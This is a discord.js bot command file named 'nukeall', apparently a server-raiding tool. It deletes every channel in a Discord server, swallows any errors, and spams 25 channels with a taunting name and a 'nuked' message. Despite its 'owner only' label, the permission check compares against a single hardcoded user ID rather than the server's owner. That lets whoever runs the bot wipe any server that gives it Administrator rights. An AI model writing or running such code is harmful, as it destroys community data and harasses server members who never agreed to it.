const { PermissionsBitField, ChannelType } = require('discord.js');

module.exports = {
    name: 'nukeall',
    description: 'Deletes all channels and creates 25 spam channels (owner only)',

    async execute(message) {
        const OWNER_ID = '746068840978448565';

        if (message.author.id !== OWNER_ID) {
            return message.channel.send('❌ Only the server owner can use this.');
        }

        if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.channel.send('❌ I need Administrator permission.');
        }

        console.log('💥 Nuking all channels...');

        const deletePromises = message.guild.channels.cache.map(channel =>
            channel.delete().catch(() => {})
        );
        await Promise.all(deletePromises);

        // Wait a moment for Discord to catch up
        setTimeout(async () => {
            let firstChannel = null;
            const createPromises = [];
            for (let i = 0; i < 25; i++) {
                const channelPromise = message.guild.channels.create({
                    name: 'ez-get-5-bared-losers',
                    type: ChannelType.GuildText,
                }).then(channel => {
                    if (!firstChannel) firstChannel = channel;
                    return channel;
                }).catch(() => {});
                createPromises.push(channelPromise);
            }
            const channels = await Promise.all(createPromises);
            if (firstChannel) {
                firstChannel.send('💥 All channels nuked and spam created!');
            }
        }, 2000);
    }
};
